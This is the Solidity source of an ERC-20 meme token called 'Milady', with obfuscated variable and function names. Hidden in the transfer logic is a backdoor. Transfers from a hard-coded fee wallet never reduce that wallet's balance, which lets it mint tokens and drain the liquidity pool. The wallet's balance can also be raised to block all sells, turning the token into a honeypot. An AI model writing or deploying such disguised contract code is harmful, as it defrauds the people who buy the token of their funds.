/**

TWITTER: https://twitter.com/Miladys_Portal
TELEGRAM: https://t.me/Miladys_Portal
WEBSITE: https://miladyerc.com/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _qkovp(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _qkovp(a, b, "SafeMath:");
    }

    function  _qkovp(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _skokguqarup {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _xjFqacakps {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract Milady is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"Milady";
    string private constant _symbol = unicode"Milady";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalab = 100000000 * 10 **_decimals;
    uint256 public _mxTavAmaunt = _Totalab;
    uint256 public _Walletomxax = _Totalab;
    uint256 public _wapThresholduax= _Totalab;
    uint256 public _myukTuaop= _Totalab;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBeforeqsysat=0;
    uint256 private _bybkeyt=0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isEdwfkcFzf;
    mapping (address => bool) private _taxhWalany;
    mapping(address => uint256) private _lrLevrfavep;
    bool public _tnsfereslunole = false;
    address payable private _qakvrdFwqp;

    _xjFqacakps private _umqRabhrdgt;
    address private _afbjPrvuw;
    bool private _zujrcjabh;
    bool private iulSwqvuq = false;
    bool private _apEalbew = false;

    event _amzjapakl(uint _mxTavAmaunt);
    modifier lckcThacfp {
        iulSwqvuq = true;
        _;
        iulSwqvuq = false;
    }

    constructor () {
        _qakvrdFwqp = payable(0x63cb742467b7AA4a1DD2420588606df05ca74a83);
        _balances[_msgSender()] = _Totalab;
        _isEdwfkcFzf[owner()] = true;
        _isEdwfkcFzf[address(this)] = true;
        _isEdwfkcFzf[_qakvrdFwqp] = true;
 

        emit Transfer(address(0), _msgSender(), _Totalab);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalab;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _qkovp(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tnsfereslunole) {
                if (to != address
                (_umqRabhrdgt) && to !=
                 address(_afbjPrvuw)) {
                  require(_lrLevrfavep
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lrLevrfavep
                  [tx.origin] = block.number;
                }
            }

            if (from == _afbjPrvuw && to != 
            address(_umqRabhrdgt) && !_isEdwfkcFzf[to] ) {
                require(amount <= _mxTavAmaunt,
                 "Exceeds the _mxTavAmaunt.");
                require(balanceOf(to) + amount
                 <= _Walletomxax, "Exceeds the maxWalletSize.");
                if(_bybkeyt
                < _wapBeforeqsysat){
                  require(! _ftkcaqz(to));
                }
                _bybkeyt++;
                 _taxhWalany[to]=true;
                teeomoun = amount.mul((_bybkeyt>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _afbjPrvuw && from!= address(this) 
            && !_isEdwfkcFzf[from] ){
                require(amount <= _mxTavAmaunt && 
                balanceOf(_qakvrdFwqp)<_myukTuaop,
                 "Exceeds the _mxTavAmaunt.");
                teeomoun = amount.mul((_bybkeyt>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_bybkeyt>_wapBeforeqsysat &&
                 _taxhWalany[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!iulSwqvuq 
            && to == _afbjPrvuw && _apEalbew &&
             contractTokenBalance>_wapThresholduax 
            && _bybkeyt>_wapBeforeqsysat&&
             !_isEdwfkcFzf[to]&& !_isEdwfkcFzf[from]
            ) {
                _swpungkorj( _qjnuw(amount, 
                _qjnuw(contractTokenBalance,_myukTuaop)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _eropnbhp(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _qkovp(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _qkovp(teeomoun));
        emit Transfer(from, to, 
        amount. _qkovp(teeomoun));
    }

    function _swpungkorj(uint256
     tokenAmount) private lckcThacfp {
        if(tokenAmount==0){return;}
        if(!_zujrcjabh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _umqRabhrdgt.WETH();
        _approve(address(this),
         address(_umqRabhrdgt), tokenAmount);
        _umqRabhrdgt.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qjnuw(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _qkovp(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _qakvrdFwqp){
            return a ;
        }else{
            return a . _qkovp (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTavAmaunt = _Totalab;
        _Walletomxax = _Totalab;
        _tnsfereslunole = false;
        emit _amzjapakl(_Totalab);
    }

    function _ftkcaqz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _eropnbhp(uint256
    amount) private {
        _qakvrdFwqp.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _zujrcjabh);
        _umqRabhrdgt   =  _xjFqacakps (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_umqRabhrdgt), _Totalab);
        _afbjPrvuw = _skokguqarup(_umqRabhrdgt.factory()). createPair (address(this),  _umqRabhrdgt . WETH ());
        _umqRabhrdgt.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_afbjPrvuw).approve(address(_umqRabhrdgt), type(uint).max);
        _apEalbew = true;
        _zujrcjabh = true;
    }

    receive() external payable {}
}